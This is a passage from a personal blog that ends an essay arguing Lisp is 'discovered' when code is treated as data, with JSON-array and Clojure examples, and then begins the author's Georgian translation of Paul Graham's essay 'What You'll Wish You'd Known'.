area to the right:

\[code\]

    ["if", ["not", testCondition], consequent]

\[/code\]

Boom. Your editor helped your change the structure of your code.

If you wanted to undo this, You can put your cursor beside
`testCondition`,

\[code\]

    ["if", ["not", |testCondition], consequent]

\[/code\]

and ask the editor to "raise" this up one level:

\[code\]

    ["if", testCondition, consequent]

\[/code\]

All of a sudden, instead of editing characters, you are editing the
*structure* of your code. This is called structural editing \[2\]. It
can help you move with the speed of a potter, and is one of the many
wins you'll get when your code is data.

## What you discovered

Well, this array language you happened to have discovered...is a poorly
implemented dialect of Lisp!

Here's our most complicated example:

\[code\]

    [
      "do",
      [
        "def",
        "drawTriangle",
        [
          "fn",
          ["left", "top", "right", "color"],
          [
            "do",
            ["drawLine", "left", "top", "color"],
            ["drawLine", "top", "right", "color"],
            ["drawLine", "left", "right", "color"],
          ],
        ],
      ],
      ["drawTriangle", { x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, "blue"],
      ["drawTriangle", { x: 6, y: 6 }, { x: 10, y: 10 }, { x: 6, y: 16 }, "purple"],
    ])

\[/code\]

And here's how that looks in Clojure, a dialect of lisp:

\[code\]

    (do 
      (def draw-triangle (fn [left top right color]
                           (draw-line left top color)
                           (draw-line top right color)
                           (draw-line left right color)))
      (draw-triangle {:x 0 :y 0} {:x 3 :y 3} {:x 6 :y 0} "blue")
      (draw-triangle {:x 6 :y 6} {:x 10 :y 10} {:x 6 :y 16} "purple"))

\[/code\]

The changes are cosmetic:

-   `()` now represent lists
-   We removed all the commas
-   camelCase became kebab-case
-   Instead of using strings everywhere, we added one more data type: a
    `symbol`
    -   A symbol is used to look stuff up: i.e `"drawTriangle"` became
        `draw-triangle`

The rest of the rules are the same:

`(draw-line left top color)`

means

-   Evaluate `left`, `top`, `color`, and replace them with their values
-   Run the function `draw-line` with those values

## Discovery?

Now, if we agree that the ability to manipulate source code is important
to us, what kind of languages are most conducive for supporting it?

One way we can solve that question is to rephrase it: how could we make
manipulating code as intuitive as manipulating *data* within *our code*?
The answer sprouts out: Make the code data! What an exciting conclusion.
If we care about manipulating source code, we glide into the answer: the
code *must* be data \[3\].

If the code must be data, what kind of data representation could we use?
XML could work, JSON could work, and the list goes on. But, what would
happen if we tried to find the simplest data structure? If we keep
simplifying, we glide into to the simplest nested structure of
all...lists!

This is both illuminating and exciting.

It's illuminating, in the sense that it seems like Lisp is "discovered".
It's like the solution to an optimization problem: if you care about
manipulating code, you gravitate towards discovering Lisp. There's
something awe-inspiring about using a tool that's discovered: who knows,
alien life-forms could use Lisp!

It's exciting, in that, there *may* be a better syntax. We don't know.
Ruby and Python in my opinion were experiments, trying to bring
lisp-like power without the brackets. I don't think the question is a
solved one yet. Maybe you can think about it 🙂

## Fin

You can imagine how expressive you can be if you can rewrite the code
your language is written in. You'd truly be on the same footing as the
language designer, and the abstractions you could write at that level,
can add up to save you years of work.

All of a sudden, those brackets look kind of cool!

------------------------------------------------------------------------

*Thanks to Daniel Woelfel,[Alex Kotliarskyi](https://frantic.im/), Sean
Grove, Joe Averbukh, Irakli Safareli, for reviewing drafts of this
essay*

# Რას მოისურვებდი რომ გცოდნოდა

(For my english readers: To improve my Georgian, I translated my
favorite essay: PG\'s \"What you\'ll wish you\'d known.\" His ideas have
had a significant influence on me, and this is the essay I wish I could
share with the most number of people. [I highly suggest you check it
out](http://www.paulgraham.com/hs.html))

პაულ გრაჰმი არის საუკეთესო პროგრამისტი, ესეების მწერალი და ბიზნესმენი.
მან გამოიგონა პირველი \"web application\" 1995-ში. ასევე შექმნა
\"Y-Combinator\", საიდანაც უმეტესობა ამერიკის მილიარდიანი კომპანიები
დაიბადა: \"Airbnb\", \"Stripe\", ა.შ.

ეს ესე არის ყველა \"ცელქი\" ადამიანისთვის. სკოლის დამთავრების შემდეგ, რა
უნდა ქნა, რომ დიდ საქმეებს მიაღწიო? სწორედ ამ ესეს შეუძლია ამ კითხვაზე
გაგცეთ პასუხი. ეს ესე ყმაწვილებისთვის არის დაწერილი, მაგრამ ახლაც ამის
კითხვისას, თავში ახალი აზრები მებადება. ვცადე ამ ესეს გადათარგმნა და
იმედი მაქვს, რომ მოგეწონებათ. ქართულს გადასარევად არ ვფლობ, ამიტომაც თუ
მოგინდებათ ჩემი ნათარგმნის რედაქტირება, [ინებეთ
ლინკი](https://docs.google.com/document/d/1U7c7ZY7W4Mb2ahDZHLehy8F15IKbd1H0NxcK81Op1OM/edit).
ასევე, თუ ფიქრობთ, რომ ვინმეს მოეწონება, გააზიარეთ 🙂

------------------------------------------------------------------------

## Რას მოისურვებდი რომ გცოდნოდა

2005 წლის იანვარი

(ეს დავწერე სკოლის გამოსაშვები საღამოსთვის, მაგრამ არასდროს
გამომიყენებია, რადგან სკოლის ხელმძღვანელობამ ჩემ მიწვევის გეგმას ვეტო
დაადო.)

Ჩემს მეგობრებს გაუკვირდათ, როდესაც ვუამბე, რომ სკოლის გამოსაშვებზე
სიტყვით გამოსვლას ვაპირებდი. რას ეტყვით სკოლის მოსწავლეებს? მაშინ მათ
ვკითხე, რას ისურვებდით თქვენთვის რომ ვინმეს ეთქვა, სკოლაში ყოფნის დროს?
მათი პასუხები საოცრად მსგავსი აღმოჩნდა. ამიტომ გიამბობთ იმას, თუ რას
ვისურვებდით, რომ ვინმეს ჩვენთვის ეთქვა.

იმის მოყოლით დავიწყებ, რისი ცოდნა თქვენთვის არ არის აუცილებელი სკოლაში
სწავლის დროს: რა გინდა რომ ცხოვრებაში გააკეთო. Ხალხი მუდმივად ამას
გეკითხება და ამიტომ ფიქრობთ, რომ პასუხი უნდა გქონდეთ, Მაგრამ ზრდასრული
ადამიანები ამას საუბრის დასაწყისშივე გეკითხებიან. Მათ სურთ გაიგონ,
როგორი ადამიანი ხარ და ეს კითხვა მხოლოდ იმისთვისაა, რომ აგალაპარაკონ. ეს
ჰგავს კიბორჩხალას, რომლისთვისაც ჯავშანზე ჯოხის მირტყმის შემდეგ აკვირდები
მის ქცევას.

Მე რომ დავბრუნებულიყავი სკოლაში და ეკითხათ ჩემს მომავალ გეგმებზე,
ვუპასუხებდი, რომ ჩემი პრიორიტეტი შესაძლებლობების შესწავლა იყო. არ არის
საჭირო იჩქაროთ თქვენი ცხოვრების საქმიანობის არჩევაში. უბრალოდ უნდა
აღმოაჩინო რა მოგწონს. თუ გინდა იყო კარგი იმაში რასაც აკეთებ, მაშინ უნდა
გააკეთო ის რაც მოგწონს.

შეიძლება მოგეჩვენოთ, რომ არაფერია იმაზე მარტივი, ვიდრე გადაწყვიტო რა
მოგწონს, მაგრამ, როგორც აღმოჩნდა, ეს ძალიან რთულია, ნაწილობრივ იმიტომ,
რომ ძნელია განსაზღვრო სხვადასხვა პროფესიის რეალური სახე. იყო ექიმი არ
არის იგივე, როგორც ტელევიზორშია ნაჩვენები. საბედნიეროდ შეგიძლია უყურო
ნამდვილ ექიმებს, თუ სააავადმყოფოებში მოხალისედ იმუშავებ. \[1\]

Მაგრამ არსებობს სხვა პროფესიებიც, რომელთა შესახებ ვერაფერს ისწავლი,
რადგან ჯერ ამას არავინ აკეთებს. უმეტესობა იმ საქმიდან, რაც მე
გამიკეთებია ბოლო ათი წლის განმავლობაში, უბრალოდ არ არსებობდა ჩემი
სწავლის პერიოდში. მᲡოფლიო სწრაფად იცვლება და სიჩქარე, რომლითაც ის
იცვლება, თავათ ჩქარდება. ასეთ სამყაროში არ არის კარგი აზრი ფიქსირებული
გეგმების შედგენა.

ყოველ მაისს, მთელ ქვეყანაში ორატორები სტანდარტული სიტყვით გამოდიან
თემაზე: არ დანებდე შენი ოცნებისთვის. ვიცი რასაც გულისხმობენ, მაგრამ
სწორად არ არის გადმოცემული სათქმელი, რადგან ეს გულისხმობ, რომ თქვენ
ვალდებული ხართ შეასრულოთ გეგმა, რომელიც ადრე დაისახეთ. კომპიუტერულ
სამყაროში ამას, ნაადრევი ოპტიმიზაცია" ეწოდება, რაც ტრაგედიის სინონიმია.
უმჯობესი იქნებოდა, უბრალოდ ეთქვათ, არ დანებდეთ.

Რასაც ისინი ნამდვილად გულისხმობენ არის ის, რომ მორალურად არ დაეცე. არ
იფიქრო, რომ შენ არ შეგიძლია გააკეთო ის, რაც სხვებს შეუძლიათ. მეც თანახმა
ვარ, რადგან სათანადოთ უნდა შეაფასო შენი შესაძლებლობა. ადამიანები,
რომლებსაც დიდი მიღწევები აქვთ, შორიდან გამოიყურებიან როგორც სხვა რასის
წარმომადგენლები. ბიოგრაფების უმეტესობა მხოლოდ აჭარბებს ამ ილუზიას,
ნაწილობრივ მათი თაყვანისმცემლური დამოკიდებულებით და ნაწილობრივ იმით, რომ
მათ იციან საბოლოო შედეგი და თავს ვერ იკავებენ ისტორიის შელამაზებისაგან,
სანამ არ გამოჩდება რომ ობიექტის ცხოვრება იყო ბედისწერა, გენიის უბრალო
გამოვლინება. Სინამდვილეში მე ვფიქრობ, რომ თექვსმეტი წლის შექსპირი ან
ეინშტეინი რომ გყოლოდათ სკოლაში, ისინი იქნებოდნენ შთაბეჭდავები, მაგრამ
დიდად არ იქნებდონენ განსვავებული თქვენი სხვა მეგობრებისგან.

ეს არაკონფორტული აზრია. თუ ისინი ისეთები იყვნენ, როგორიც ჩვენ, ესეიგი
მათ მოუწიათ თავდაუზოგავი შრომა, რომ მიეღწიათ იმას, რასაც უკვე მიაღწიეს.
ეს არის ერთ-ერთი მიზეზი, თუ რატომ გვჯერა გენიოსების. ეს გვაძლევს მიზეზს,
რომ ვიყოთ ზარმაცები. თუ ამ ადამიანებმა შეძლეს ექნათ ის რაც ქნეს, რაღაც
მაგიური შეკსპირიანობით ან ეინშტეიანობით, მაშინ ჩვენი ბრალი არაა, რომ
ჩვენ არ შეგვიძლია რაღაც მაგდაგვარი რამის გაკეთება.

Მე არ ვამბობ, რომ გენიოსობა არ არსებობს,მაგრამ ორი თეორიიდან არჩევანს თუ
აკეთებ და ერთ-ერთი გაძლევს გამართლებას, რომ იყო ზარმაცი, ალბათ მეორე
არის ჭეშმარიტი

ჯერჯერობით სტანდარტული მიმართვა ,,არ დანებდე შენ ოცნებას", დავიყვანეთ
,,რაც სხვას შეუძლია, შენც შეგიძლიაზე", მაგრამ საჭიროა ამ მოსაზრების
განხილვა. არსებობს ცვალებადობა პიროვნების ბუნებრივ შესაძლებლობებში.
ადამიანების უმეტესობა მის მნიშვნელობას ზედმეტად აფასებს, მაგრამ ის
ნამდვილად არსებობს. Მე რომ ვსაუბრობდე ოთხი-ფუტის სიმაღლის ბიჭთან, რომლის
ამბიცია არის NBA-ში თამაში, თავს სულელად ვიგრძნობდი, რომ მეთქვა, მას
ყველაფრის მიღწევა შუეხლია, თუ ნამდვლად მოინდომებს. \[2\]

Ჩვენ უნდა ჩამოვაყალიბოთ სტანდარტული მიმართვა :,,ის რისი გაკეთებაც
შეუძლია სხვას შენნაირი შესაძლებლობებით, შენც შეიგძლია გააკეთო და
ნაკლებათ არ შეაფასო შენი შესაძლებლობები.", მაგრამ როგორც ხშირად ხდება,
რაც უფრო უახლოვდები ჭეშმარიტებას, მით უფრო რთული ხდება გააზრება. Ჩვენ
გამოვიყენეთ მარტივი, მაგრამ არასწორი სლოგანი და ტალახის გუბეში
გადავაქციეთ. ეს უკვე არ წარმოადგენს კარგ მიმართვას, მაგრამ კიდევ უარესი
ისაა, რომ ეს აღარ გეუბნება, თუ რა უნდა გააკეთო. ვინ შენი
შესაძლებლობებით? Რა არის შენი შესაძლებლობები?

### ქარის წინააღმდეგ

მე ვფიქრობ, გამოსავალი არის სხვა მიმართულებით მუშაობა. იმის ნაცვლად, რომ
იმუშაო მიზნიდან გამომდინარე, იმუშავე პერსპეკტეული სიტუაციებიდან.
ყოველშემთხვევაში, ეს ზუსტად ის არის, რასაც აკეთებს უმეტესობა წარმატებული
ადამიანი.

გამოსაშვებზე მიმართვის აზრით, სტუდენტმა უნდა გადაწყვიტოს, სად უნდა იყოს
20 წელიწადში და დასვას კითხვა: რა უნდა გავაკეთო ახლა, რომ მივიდე
მაგამდე? Მე გთავაზობთ, იმის ნაცვლად, რომ თქვენ მიეჯაჭვოთ სამომავლო
მიზანს, უბრალოდ დააკვირდით არსებულ ვარიენტებს და აირჩიეთ ის, რაც შემდგომ
მოგცემთ ყველაზე პერსპეკტიულ ვარიანტებს.

არც ისე მნივშნელოვანია კონკრეტულად რაზე მუშაობ, თუ არ კარგავ შენ დროს.
იმუშავე იმაზე რაც შენთვის საინტერესოა, გაზარდე შენი შესაძლებლობები და
მოგვიანებით იმაზე იდარდე, თუ რომელ ვარიანტს აირჩევ.

Წარმოიდგინე რომ პირველკურსელიხარ, რომელიც მათემათიკის ან ეკონომიკის
სპეციალიზაციის გადაწყვეტილების მიღების პროცესშია. Რომ დაფიქრდე,
Მათემათიკა უფრო მეტ არჩევანს მოგცემს: შენ შეგიძლია თითქმის ყველა
მიმართულებით წასვლა მათემათიკიდან. თუ თქვენი სპეციალიზაცია არის
მათემატიკა, თქვენთვის ადვილი იქნება ეკონომიკის ასპირანტურაში ჩაბარება,
მაგრამ თუ თქვენი სპეციალაზაცია არის ეკონომიკა, თქვენთვის რთული იქნება
მათემათიკის ასპირანტურაში ჩაბარება.

Პლანერით ფრენა კარგი მეტაფორაა ამ შემთხვევაში. იმის გამო რომ პლანერს არ
აქვს ძრავა, შეუძლებელია ქარის მიმართულებით იფრინო, სიმაღლის დაკარგვის
გარეშე. თუ თავს უფლებას მისცემთ გაფრინდეთ შორს ქართან ერთად, დაშვების
კარგი ადგილის მოსაძებნად, თქვენი არჩევანი იფარგლება არაკომფორტულით.
Როგორც წესი, შენთვის უკეთესია ქარის საწინაამდეგოდ ყოფნა. ეს არის ის,
რასაც მე გთვაზობ, როგორც ალტერნატივა ,,არ დანებდე შენ ოცნებისთვის".
დარჩი ქარის საწინაამდეგოდ.

Როგორ უნდა შევძლოთ ეს? Მაშინაც კი, თუ მათემათიკა ეკონომიკასთან
მიმართებაში არის ქარის საწინააღმდეგოდ ფრენა, საიდან უნდა იცოდეს ეს
სკოლის მოსწავლემ?

Სიმართლე გითხრათ, არსაიდან. ეს არის Ზუსტად ის, რისი გაარკვევაც შენ
გჭირდება. ეძებეთ ჭკვიანი ადამიანები და რთული ამოცანები. ზოგადად, ჭკვიანი
ხალხი იკრიბება ერთად და თუ ასეთ ჯგუფს იპოვი, ალბათ ღირებული იქნება, რომ
შეურთდე მათ, Მაგრამ ასეთი ჯგუფების პოვნა არც ისე ადვილია, რადგან გარშემო
ბევრი სიყალბეა.

უნივერსტიტეტის დასაწყისში, ყველა სტუდენტისთვის ფაკულტეტი ერთნაერად
გამოიყურება. ყველა პროფესორი არის უსიამოვნოდ ინტელექტუალური და
აქვეყნებენ გაუგებარ სტატიებს. Მიუხედავად ამისა, ზოგიერთ სფეროში
ნაშრომები გაუგებარია, რადგან ისინი სავსეა რთული იდეებით, სხვა სფეროს
ნაშრომები შეგნებულად დაწერეს დამაბნეველი ენით, რომ ისე ჩანდეს, თითქოს
რამე მნიშვნელოვანია დაწერილი. ეს შეიძლება სკანდალურ წინადადებად ჩანდეს,
მაგრამ ის ექსპერიმენტულურად დაადასტურა ცნობილიმა საზოგადოებრივ ტექსტის
საქმემ, რადგან ფიზიკოსი ეჭვობდა, რომ ლიტერატურის თეორიტიკოსების მიერ
გამოქვეყნებული ნაშრომები ხშირად ინტელექტუალურული ჟღერადობის სისულელეა.
ფიზიკოსმა განზრახ დაწერა ინტელექტუალური ჟღერადობის სისულელეებით სავსე
ნაშრომი და წარუდგინა ლიტერატურული თეორიის ჟურნალს, რომელმაც ის გამოსცა.

Საუკეთესო დაცვა ამისგან არის, მუდმივად რთულ პრობლემზე მუშაობა.
Მოთხრობების წერა რთულია. Მოთხრობების კითხვა არა. სირთულე ნიშნავს
მღელვარებას: თუ არ ნერვიულობ იმაზე, რომ რასაც აკეთებ, ცუდად გამოვა, ან
ვერ შეძლებ იმის გაგებას, რასაც სწავლობ, მაშინ ეს არ არის საკმარისად
რთული პრობლემა. ყოველთვის უნდა იყოს რაღაც გაურკვეველი.

თქვენ შეიძლება იფიქროთ, რომ ეს სამყაროს მკაცრი ხედვაა, მაგრამ მე
გეუბნებით, რომ უნდა ინვერვიულოთ? დიახ, მაგრამ ეს არც ისე ცუდია როგორც
ისმის. Წუხილის გადალახვა გამამხნევებელია. იშვიათად თუ დაინახავ ბევრად
უფრო ბედნიერ სახეებს, ვიდრე იმ ადიამანებისას, რომლებმაც ოქროს მედლები
მოიგეს. იცით, თუ რატომ არიან ისინი ასეთი ბედნიერები? შვება იგრძნეს..

Მე არ ვამბობ რომ ეს არის ბედნიერების ერთადერთი გზაა. უბრალოდ წუხილის
ზოგიერთი სახეობა არც ისე ცუდია როგორც ჩანს.

### ამბიცია

Პრაკტიკაში, ,,იყავით ქარის საწინააყმდეგოდ" დავიდა, იმუშავე რთულ
ამოცანებზე" და შენ შეგიძლია დღესვე დაიწყო. Ვისურვებდი, რომ ეს მცოდნოდა
სკოლის დროს.

ადამიანების უმრავლესობას უნდათ, რომ იყვნენ კარგები იმაში რასაც აკეთებენ.
ე.წ. ,,რეალურ სამყაროში" ეს მოთხოვნილება ძლიერი ძალაა, მაგრამ სკოლის
მოსწავლეები იშვიათად ღებულობენ სარგებელს ამით, რადგან მათ აიძულებენ
გააკეთონ რაღაც ყალბი. როდესაც სკოლაში ვსწავლობდი, ჩემი თავი დავარწმუნე
იმაში, რომ ჩემი მოვალეობაა კარგი მოსწავლედ ყოფნა. მე დავიკმაყოფილე
მოთხოვნილობა, იმით, რომ სკოლაში კარგად ვსწავლობდი.

Ჩემთვის რომ გეკითხათ, რაშია განსხვავება სკოლის ბავშვებსა და ზრდასრულებს
შორის, მე ვიტყოდი, რომ ზრდასრულებს უწევთ ფულის შოვნა, მაგრამ ეს
არასწორია. განსხვავება იმაშია, რომ ზრდასრულები იღებენ პასუხისგებლობას
საკუთარ თავზე. ფულის შოვნა მხოლოდ მცირე ნაწილია, ბევრად უფრო
მნიშვნელოვანია ინტელეკტუალური პასუხისმგებლობების აღება საკუთარ თავზე.

თუ ისევ მომიწევდა საშუალო სკოლის გავლა, მე მას აღვიქვავდი, როგორც
დროებით სამუშაოს. Მე არ ვგულისხმობ სკოლაში დასვენებას. დროებით
სამსახურში მუშაობა არ ნიშნავს იმას, რომ საქმეს ცუდათ გააკეთებ. ეს
ნიშნავს, რომ შენ თავს არ განსაზღრავ ამ საქმით. მე იმას ვგულისხმობ, რომ
არ ვიფიქრებდი ჩემს თავზე, როგოც უფროს კლასელ მოსწავლეზე, იგივე ნაირად
როგორც მუსიკოსი, რომელიც დღეგამოშვებით მუშაობს მიმტანად, მაგრამ თავს არ
მიიჩნევს ამ პროფესიის წარმომადგენლად. \[3\] იმ დროს, როდესაც მე არ
ვიქნებოდი ამ სამსახურში, მე დავიწყებდი რეალური საქმის კეთებას.

როდესაც ხალხს ვეკითხები, რას ნანობენ ყველაზე მეტად საშუალო სკოლის
შესახებ, თითქმის ყველა ერთსა და იმავეს ამბობს: ისინი ნანობენ, რომ ამდენი
დრო ტყუილად დაკარგეს. თუ თქვენ გაინტერესებთ, რას აკეთებ ახლა, მომავალში
მოგვიანებით ინანებთ, ალბათ ეს არის პასუხი. \[4\]

Ზოგი ადამიანი ამბობს, რომ ეს გარდაუვალია, რაეგან სკოლის მოსწავლეებს ჯერ
არაფრის გაკეთება არ შეუძლიათ, Მაგრამ მე არ ვფიქრობ, რომ ეს სიმართლეა.
ამის მტკიცებულება ის არის, რომ თქვენ მოგბეზრდათ. ალბათ 8 წლის ასაკში არ
მოგბეზრდებოდათ, როდესაც 8 წლის ხარ, სიტყვა "ჰენგაუთის"- ის ნაცვლად,
"თამაშს" იყენებ, მაგრამ ეს იგევეა. Როდესაც 8 წლის ვიყავი, იშვიათად
ვიყავი მოწყენილი. Მომეცი ეზო, რამდენიმე ბავშვი და მე შემეძლომთელი დღე
მეთამაშა.

ახლა ვაცნობიერებ, რომ მიზეზი, რის გამოც საშუალო და მაღალ კლასებში ასეთ
თამაშმა თავისი მიმზიდველობა დაკარგა, ისაა, რომ მე უკვე მზად ვიყავი სხვა
სიახლეებისთვის. ბავშვობა რჩებოდა წარსულში.

მე არ ვამბობ, რომ არ უნდა გაერთოთ მეგობრებთან ერთად და უნდა გახდეთ
პატარა რობოტები, იუმორის გრძნობის გარეშე, რომლებიც მხოლოდ მუშაობენ.
მეგობრებთან გართობა შოკოლადის ტორტს გავს. ის უფრო მოგწონთ, როდესაც
დროდადრო მიირთმევთ და არა მაშინ, როცა ტორტი კვების რაციონის მთავარ
კომპონენტად ითვლება. როგორც არ უნდა მოგწონდეს შოკოლადის ტორტი, მისი
მესამეჯერ ჭამის შემდეგ გული აგერევათ. Სწორედ ამ სისუსტეს გრძნობენ უფროს
კლასელები: ტვინის ,,გულისრევის" შეგრძნენბას. \[5\]

Შეიძლება ფიქრობთ, რომ კარგი შეფასების მიღებაზე მეტი უნდა გავაკეთოთ. Ჩვენ
უნდა გავაკეთოთ სასწავლო პროგრამაზე მეტი, Მაგრამ თქვენ თვითონ იცით
მშვენივრად რამდენად ყალბია ეს. ქველმოქმედება არის მშვენიერი რამ და არც
რთული. ამით ვერ მიაღწევთ რაიმე მიზანს. Მიზნის მიღწევაში ვგულისხმობ,
მაგალითად, როდესაც ადამიანი სწავლობს ესეს კარგად წერას, ან კომპიუტერების
პროგრამირებას, ან შეისწავლის, თუ როგორი იყო ცხოვრება წინა-ინდუსტრიულ
საზოგადოებებში, ან ისწავლის პორტრეტების დახატვას. ეს ყველაფერი იშვიათად
არის ნახსენები კოლეჯის მისაღებ აპლიკაციაში.

### კორუპცია

Სახიფათოა ცხოვრების მიმართვა მხოლოდ კოლეჯში ჩაბარებაზე, რადგან
ადამინები, რომლებზეც თქვენ უნდა მოახდინოთ შთაბეჭდილობა კოლეჯში
მოსახვედრად არ წარმოადგენენ ძალიან გამჭრიახ აუდიტორიას. Პროფესორები კი
არ წყვეტენ შენ მოხვედრას სასწავლებელში, ამას წყვეტენ მიმღები კომისიის
წევრები, რომლებიც არც ისე ჭკვიანები არიან. ისინი ინტელექტუალური სამყაროს
სერჟანტები არიან. Მათ არ შეუძლიათ გითხრან თუ რამდენად ჭკვიანი ხარ.
Მოსამაზადებელი სკოლების არსებობა არის ამის დასტური.

არც თუ ბევრი მშობელი გადაიხდიდა დიდ თანხას იმაში რომ შვილებმა ისეთ
სკოლაში იარონ, რომელიც არ ზრდის მათვის ჩაბარების შანსებს. Მოსამზადებელი
სკოლები ღიად აცხადებენ რომ ეს მათი მიზანია. Მაგრამ რას ნიშნავს ეს თუ
დაფიქრედბით, არის ის, რომ მათ შეუძლიათ შეცვალონ მიღების პროცესი: მათ
შეუძლიათ ბავშვი უფრო მიმზიდველ კანდიდატატ წარადგინონ, ვიდრე ის რომ
დადიოდეს ადგილობრივ უბრალო საჯარო სკოლაში \[6\].

ახლა, უმეტესობა ფიქრობთ, რომ თქვენი მთავარი სამუშაო არის ის რომ იყოთ
პოტენციურათ კარგი აპლიკანტი. Მაგრამ ეს ნიშნავს, რომ შენს ცხოვრებას
მიმართავ ისეთი უაზრო პროცესის დასაკმაყოფილებლად, რომლის დამხობასაც
მთელმა ინდუსტრიამ მიუძღვნა თავი. გასაკვირი არ არის რომ ხდებით ცინიკოსი.
Სისუსტე, რომელსაც გრძნობ ისეთივეა, როგორსაც სატელევიზიო გადაცემის
რეჟისორი ან თანბაქოს ინდუსტრიის ხელმძღვანელი. თანაც საკმარის თანხას არ
გიხდიან.

Რა უნდა გააკეთო? ის რაც არ უნდა გააკეთო \-- მოაწყო ამბოხი. ეს ზუდად ის
არის, რაც მე გავაკეთე და ეს შეცდომა იყო. Ზუსტად ვერ გავაანილზე რა
გვემართებოდა, მაგრამ მივხვდი რომ საქმის კარგი სუნი არ ასდიოდა. უბრალოდ
დავნებდი. მსოფლიო ჭაობშია, თავი რატომ შევიწუხო?

როდესაც აღმოვაჩინე რომ ერთ-ერთი ჩვენი მასწავლებელიც კი იყენებდა
"შპარგალკას", სხვას არც ველოდი. Რა თქმა უნდა, რომ ამ გაკვეთილზე კარგ
ქულასაც ფასი არ ექნება.

Რეტროსპექტურად ეს სისულელე იყო. თითქოს ვიღაცამ წესები დაარღვია ფეხბურთის
თამაშის დროს, და შენ გამწარებით დატოვე სტადიონი პროტესტის ნიშნად.
დარღევები ხდება. Მაგრამ ამ დროს Მთავარია არ დაკარგო კონტროლი. უბრალოდ
გააგრძელე თამაში.

ამ მდგომარეობაში ჩაყენებით საზოგადოებამ არაკეთილსინდისიერი თამაში
ითამაშა შენთან. დიახ, როგორც ვარაუდობთ, ბევრი იმისაგან, რასაც სწავლობთ,
უბრალოდ სისულელეა. და ასევე, როგორც თქვენ ეჭვობთ, კოლეჯში მიღების
პროცესი მეტწილად თვალთმაქცობაა. მრავალი დარღვევის მსგავსად, ეს უნებლიე
იყო. \[7\] ასე რომ, უბრალოდ განაგრძე თამაში.

მეამბოხეობა თითქმის ისეთივე სისულელეა, როგორც მორჩილება. Ნებისმიერ
შემთხვევაში, საკუთარ თავს საზღვრავთ იმით, თუ რას გეუბნებიან რომ გააკეთო.
ვფიქრობ, საუკეთესო გეგმაა პერპენდიკულარულ ვექტორზე გადასვლა. ნუ გააკეთებ
მხოლოდ იმას, რასაც გეუბნებიან და ნუ იტყვი უბრალოდ უარს. ამის ნაცვლად,
მოექეცით სკოლას როგორც დროებით სამუშაოს. როგორც ხდება ხოლმე დროებით
სამუშაოზე, ის საკმაოდ სასიამოვნოა. სამ საათზე უკვე თავისუფალი ხართ და
სკოლაში ყოფნის დროსაც კი შეგიძლიათ საკუთარი საქმით დაკავდეთ.

### ცნობისმოყვარეობა

და რა უნდა იყოს თქვენი ნამდვილი სამუშაო? თუ არ ხართ მოცარტი, ეს თქვენი
პირველი ამოცანაა: სად შეიძლება გაკეთდეს კარგისაქმეები? რომელ სფეროებში
მუშაობენ შთამბეჭდავი ადამიანები? და რაც მთავარია, რა გაინტერესებს?
სიტყვა \"ნიჭს\" შეცდომაში შეჰყავს, რადგან ის გულისხმობს რაღაცას
თანდაყოლილს. Ნიჭის მიდრეკილების ყველაზე ძლიერი სახეობა არის საკითხისადმი
დაუოკებელი ინტერესი და ეს ინტერესი ხშირად შეძენილი გრძნობაა.

ამ იდეის დამახინჯებულმა ვერსიამ პოპულარულ კულტურაში გაჟონა სიტყვით
\"ვნება\". მე ცოტა ხნის წინ ვნახე რეკლამა მიმტანებისთვის, სადაც იყო
ნათქვამი, რომ მათ სურდათ ადამიანები, რომლებსაც აქვთ \"მომსახურების
ვნება\". მაგიდის მომსახურებას ვერ დაარქმევ ვნებას. და ვნება ცუდი სიტყვაა
მისთვის. ცნობისმოყვარეობა საუკეთესო სიტყვა იქნებოდა

ბავშვები ცნობისმოყვარეები არიან, მაგრამ მე სხვა სახის ცნობისმოყვარეობას
ვგულისხმობ. ბავშვების ცნობისმოყვარეობა ფართოა და არა არის ღრმა; ისინი
კითხულობენ \"რატომ\" სრულიად შემთხვევითი ფორმით ყველაფერზე. უფროსების
უმეტესობაში ეს ცნობისმოყვარეობა მთლიანად არის განლეული. ასეც უნდა იყოს:
შეუძლებელია რაიმეს გაკეთება, თუ ყველაფერზე კითხულობ \"რატომ\". მაგრამ
ამბიციურ ზრდასრულს იმის ნაცვლად რომ განიხილოს ცნობისმოყვარეობა, ის ხდება
ვიწროდმიმართული და ღრმა. ბინძური ზედაპირი გარდაიქმნება ანკარა წყაროდ.

ცნობისმოყვარეობა სამუშაოს თამაშად აქცევს. აინშტაინისთვის ალბათობის
თეორია არ ყოფილა რთული საგნებით სავსე წიგნად, რომელიც მას უნდა ესწავლა
გამოცდისათვის. ის იყო ამოცანა, რომლის გადაწყვეტასაც ის ცდილობდა. ასე
რომ, სავარაუდოდ, მისთვის უფრო ადვილი იყო მისი აღმოჩენა, ვიდრე სხვისთვის
მისი სწავლა სკოლაში.

ერთ-ერთი ყველაზე საშიში ილუზიას რომელსაც იძენთ სკოლაში სწავლის პერიოდში,
განისაზღვრება იდეაში, რომ კარგისაქმეების კეთება მოითხოვს მკაცრ
თვითდისციპლინას. საგნების უმეტესობა ისწავლება ისეთი მოსაწყენი
მეთოდიებითთ, რომ მხოლოდ თვითდისციპლინის მეშვეობით შეგიძლიათ გაიაროთ. ასე
რომ, მე ვიყავი გაოცებული, როდესაც კოლეჯში სწავლის დაწყებისთანავე
ვიტგენშტეინის ციტატა წავიკითხე, რომ მას საერთოდ არ გააჩნდა
თვითდისციპლინა და მას არასდროს შეეძლო უარის თქმა საკუთარი თავისათვის
არაფერზე, თუნდაც ფინჯან ყავაზეც.

ახლა მე უამვრავ ადამიანს ვიცნობ, რომლებიც შესანიშნავად ასრულებენ საქმეს
და ისინი მსგავსები არიან ამაში. მათ სუსტი დისციპლინა აქვთ. ისინი
ყველაფერს საშინლად აჭიაუნერებენ და თითქმის ვერ ახერხებენ თავს დააძალონ
აკეთონ რაიმე, რაც მათ არ აინტერესებთ. ერთ-ერთმა მათგანმა ჯერ კიდევ არ
გააგზავნა მადლობის ბარათები მისი ქორწილის, რომელიც ოთხი წლის წინ იყო.
სხვას აქვს 26,000 წერილი ელ.ფოსტაზე.

მე არ ვამბობ, რომ თქვენ სრულად არ გესაჭიროებათ თვითდისციპლინა. ვფიქრობ,
იმდენი დისციპლინა გესაჭიროება, რამდენიც აუცილებელია რომ სირბილი დაიწყოთ.
მე ხშირად მეზარება სირბილი, მაგრამ მას შემდეგ, რაცა დავიწყებ, სირბილი
სიამოვნებას მანიჭებს. თუ რამდენიმე დღე არ დავრბივარ, თავს კარგად ვერ
